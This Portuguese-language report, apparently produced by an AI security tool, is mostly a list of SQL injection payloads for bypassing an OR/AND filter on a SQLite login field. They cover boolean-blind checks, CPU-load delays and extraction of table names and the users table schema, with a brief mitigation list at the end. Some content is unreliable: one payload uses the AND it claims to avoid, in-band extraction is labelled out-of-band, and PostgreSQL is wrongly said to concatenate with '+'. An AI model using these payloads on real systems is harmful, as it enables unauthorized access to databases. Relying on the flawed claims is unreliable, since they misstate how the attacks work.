# Relatório de Validação de SQL Injection: SQLite (Bypass de Filtros Lógicos)

**Alvo:** Campo de Login
**Banco de Dados:** SQLite
**Restrição de Aplicação:** Filtro de caracteres `OR` e `AND`
**Gerado por:** DeepHat (Kindo)

## 1. Visão Geral
Este documento descreve as variações de payload para explorar vulnerabilidades de SQL Injection em um banco de dados SQLite, considerando a aplicação de filtros que bloqueiam operadores lógicos comuns (`OR`, `AND`). As técnicas empregam operadores de comparação (`LIKE`), estruturas condicionais (`CASE`) e metadados nativos do SQLite (`sqlite_master`) para contornar as restrições.

## 2. Técnicas de Exploração

### 2.1. Boolean-Blind (Inferência Lógica)
**Objetivo:** Determinar a veracidade de uma condição (True/False) baseada no feedback da aplicação (sucesso/falha de login), sem exibir dados diretamente.
**Estratégia de Bypass:** Substituir `AND`/`OR` por `LIKE` e subqueries.

*   **Payload Base (Login):**
    ```sql
    admin' LIKE 'a%' --
    ```
*   **Lógica:**
    *   Se o usuário `admin` existir e começar com `a`, a expressão é `TRUE`.
    *   Se começar com outra letra, é `FALSE`.
*   **Variação para Verificação de Tabela (Bypass de AND):**
    ```sql
    admin' LIKE (SELECT 1 FROM sqlite_master WHERE name='users' LIMIT 1) --
    ```
    *   *Nota:* Em SQLite, se a subquery retornar `1` (ou o nome da tabela, dependendo do cast implícito), a comparação `LIKE` avalia a presença do objeto.

### 2.2. Time-Based (Inferência por Tempo/CPU)
**Objetivo:** Extrair dados quando não há feedback visual claro, forçando um atraso na resposta da aplicação.
**Estratégia de Bypass:** Como SQLite não possui função `SLEEP()`, o atraso é simulado via operações intensivas de CPU (como `GROUP_CONCAT` em tabelas grandes ou repetição de `LIKE`) condicionadas por `CASE WHEN`.

*   **Payload (Simulação de Delay):**
    ```sql
    admin' LIKE (SELECT CASE WHEN (SELECT 1 FROM sqlite_master WHERE name='users' LIMIT 1) LIKE 'u%' THEN (SELECT GROUP_CONCAT(value) FROM pragma_table_info('users')) ELSE '' END) --
    ```
*   **Variação de Alto Impacto (CPU Load):**
    ```sql
    admin' LIKE (SELECT CASE WHEN (SELECT 1 FROM sqlite_master WHERE name='users' LIMIT 1) LIKE 'u%' THEN (SELECT name FROM sqlite_master WHERE type='table' AND name LIKE 'u%' AND name LIKE 'u%' AND name LIKE 'u%' AND name LIKE 'u%') ELSE '' END) --
    ```
*   **Mecanismo:** A condição `WHEN` verifica a presença da tabela. Se verdadeira, o parser executa operações repetitivas ou agregações pesadas, aumentando o tempo de resposta (TTFB).

### 2.3. Out-of-Band (Exfiltração via Resposta)
**Objetivo:** Extrair metadados ou DDL (Data Definition Language) do banco de dados utilizando o canal de resposta da aplicação (ex: campo de erro ou perfil do usuário).
**Estratégia de Bypass:** Uso de `GROUP_CONCAT` e concatenação de strings para injetar o schema no valor retornado.

*   **Payload (Extração de Schema):**
    ```sql
    admin' LIKE (SELECT 'admin' || (SELECT GROUP_CONCAT(name) FROM sqlite_master) || 'x') --
    ```
*   **Payload (Extração de DDL da Tabela 'users'):**
    ```sql
    admin' LIKE (SELECT 'admin' || (SELECT sql FROM sqlite_master WHERE type='table' AND name='users') || 'x') --
    ```
*   **Resultado Esperado:**
    *   Se a aplicação retornar o campo `username` em um erro de SQL ou perfil, a saída conterá: `adminCREATE TABLE users (... )x`.
    *   Isso permite a recuperação completa da estrutura do banco sem interação adicional.

## 3. Tabela Resumo de Payloads

| Técnica | Objetivo | Payload Principal | Bypass de Filtro |
| :--- | :--- | :--- | :--- |
| **Boolean-Blind** | Verificação Lógica | `admin' LIKE 'a%' --` | `LIKE` substitui `AND` |
| **Time-Based** | Delay/CPU Load | `admin' LIKE (SELECT CASE WHEN ... THEN ... END) --` | `CASE WHEN` substitui `OR` |
| **Out-of-Band** | Extração de Dados | `admin' LIKE (SELECT 'admin' \|\| (SELECT GROUP_CONCAT...)) --` | Concatenação e `GROUP_CONCAT` |

## 4. Notas Técnicas e Implementação

1.  **Características do SQLite:**
    *   Não possui funções de tempo nativas (`SLEEP`, `BENCHMARK`). O Time-based depende de carga computacional.
    *   O sistema de metadados é acessível via `sqlite_master`.
    *   A função `GROUP_CONCAT` é essencial para extração de múltiplos valores em uma única string.

2.  **Contorno de Filtros:**
    *   **`LIKE` como Operador Lógico:** Utilizado para comparar valores e criar condições de verdade sem operadores booleanos explícitos.
    *   **`CASE WHEN`:** Estrutura de controle de fluxo nativa que permite lógica condicional complexa sem `AND`/`OR`.
    *   **Concatenação (`||`):** Padrão SQL para juntar strings, diferente do `+` usado em MySQL/PostgreSQL.

3.  **Recomendações de Mitigação:**
    *   Utilizar **Prepared Statements** (Parâmetros Bindados) para eliminar a possibilidade de injeção.
    *   Implementar validação de entrada no lado do servidor (allowlist de caracteres).
    *   Revisar a lógica de autenticação para garantir que erros de SQL não exponham metadados do banco.
